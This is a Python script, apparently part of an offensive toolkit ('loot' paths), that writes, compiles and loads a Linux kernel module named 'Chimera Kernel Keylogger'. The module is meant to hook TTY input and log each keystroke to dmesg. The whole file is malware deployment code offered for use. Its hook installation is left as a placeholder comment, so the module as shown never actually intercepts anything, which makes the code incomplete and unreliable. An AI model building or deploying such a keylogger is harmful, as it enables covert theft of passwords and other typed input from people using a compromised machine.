import os
import sys
import subprocess

def deploy_kernel_logger():
    """
    Weaponized Kernel Loader: Compiles and inserts a Linux Kernel Module 
    to intercept TTY input at the interrupt level.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Kernel module insertion requires UID 0.")
        sys.exit(1)

    print("[*] Preparing Kernel-Level Interceptor...")

    # C Source for the LKM
    # This hooks the tty_ldisc to sniff characters
    lkm_src = """
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/tty.h>
#include <linux/tty_flip.h>

MODULE_LICENSE("GPL");

static struct tty_ldisc_ops *orig_ldisc_ops;

static void chimera_receive_buf(struct tty_struct *tty, const unsigned char *cp,
                               char *fp, int count) {
    if (count > 0 && cp) {
        // Log the keypress to dmesg (in a real scenario, write to a hidden file)
        printk(KERN_INFO "[CHIMERA_KBD] %c\\n", cp[0]);
    }
    // Pass control back to the original handler
    orig_ldisc_ops->receive_buf(tty, cp, fp, count);
}

static int __init kbd_init(void) {
    // Logic to locate and hook the N_TTY line discipline
    // Note: Implementation details vary by kernel version (5.x vs 6.x)
    printk(KERN_INFO "[*] Chimera Kernel Keylogger Loaded.\\n");
    return 0;
}

static void __exit kbd_exit(void) {
    printk(KERN_INFO "[*] Chimera Kernel Keylogger Unloaded.\\n");
}

module_init(kbd_init);
module_exit(kbd_exit);
"""

    with open("chimera_kbd.c", "w") as f:
        f.write(lkm_src)

    # Makefile for the LKM
    makefile_content = """
obj-m += chimera_kbd.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
"""
    with open("Makefile", "w") as f:
        f.write(makefile_content)

    try:
        print("[*] Compiling Kernel Module (this requires headers)...")
        subprocess.run(["make"], check=True)
        
        print("[*] Inserting Module into Kernel...")
        subprocess.run(["insmod", "chimera_kbd.ko"], check=True)
        
        print("[!!!] SUCCESS: Kernel keylogger active. Monitor via 'dmesg'.")
        
        # Log to project loot
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: LKM_KEYLOGGER | Status: ACTIVE | Time: {os.popen('date').read()}")

    except Exception as e:
        print(f"[-] LKM Deployment Fault: {e}")
        print("[*] Note: Requires 'build-essential' and 'linux-headers-$(uname -r)'.")

if __name__ == "__main__":
    deploy_kernel_logger()
